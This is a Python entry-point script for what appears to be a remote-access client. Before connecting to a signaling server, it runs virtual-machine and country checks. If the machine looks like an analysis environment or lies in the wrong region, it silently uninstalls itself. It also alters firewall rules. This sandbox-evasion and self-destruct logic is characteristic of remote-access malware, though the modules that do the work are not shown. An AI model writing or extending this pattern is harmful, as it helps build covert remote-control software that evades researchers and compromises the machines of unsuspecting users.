"""Entry point for the remote client."""
from __future__ import annotations

import argparse
import asyncio
import os

from remote_client.config import (
    load_antifraud_config,
    resolve_session_id,
    resolve_signaling_token,
    resolve_team_id,
)
from remote_client.runtime import build_client, load_or_create_device_token
from remote_client.security.anti_frod_reg import analyze_region
from remote_client.security.anti_frod_vm import analyze_device
from remote_client.security.firewall import ensure_firewall_rules
from remote_client.security.self_destruct import silent_uninstall_and_cleanup
from remote_client.windows.dpi import ensure_dpi_awareness


def _anti_fraud_disabled() -> bool:
    value = os.getenv("RC_DISABLE_ANTI_FRAUD", "")
    return value.strip().lower() in {"1", "true", "yes", "on"}


def main() -> None:
    ensure_dpi_awareness()
    base_dir = os.path.dirname(os.path.abspath(__file__))
    antifraud_config = load_antifraud_config()
    if _anti_fraud_disabled():
        print("Region anti-fraud disabled for local testing.")
    else:
        vm_result = None
        reg_result = None
        if antifraud_config.vm_enabled:
            vm_result = analyze_device()
        if antifraud_config.region_enabled:
            reg_result = analyze_region(antifraud_config.countries)
        if (vm_result and vm_result.is_suspicious) or (
            reg_result and reg_result.is_suspicious
        ):
            silent_uninstall_and_cleanup(base_dir)
            return

    ensure_firewall_rules()

    parser = argparse.ArgumentParser(description="Remote controller client")
    parser.add_argument(
        "--session-id",
        help="Session identifier used to register with the signaling server.",
    )
    parser.add_argument(
        "--team-id",
        help="Team identifier bound to this client (optional).",
    )
    args = parser.parse_args()
    session_id = resolve_session_id(args.session_id)
    team_id = resolve_team_id(args.team_id)
    print(f"Using session_id: {session_id}")

    signaling_token = resolve_signaling_token()
    device_token = load_or_create_device_token()
    client_config = {
        "antifraud": {
            "vm": antifraud_config.vm_enabled,
            "region": antifraud_config.region_enabled,
            "countries": list(antifraud_config.countries),
        }
    }
    client = build_client(
        session_id,
        signaling_token,
        device_token,
        team_id,
        client_config,
    )
    asyncio.run(client.run_forever())


if __name__ == "__main__":
    main()
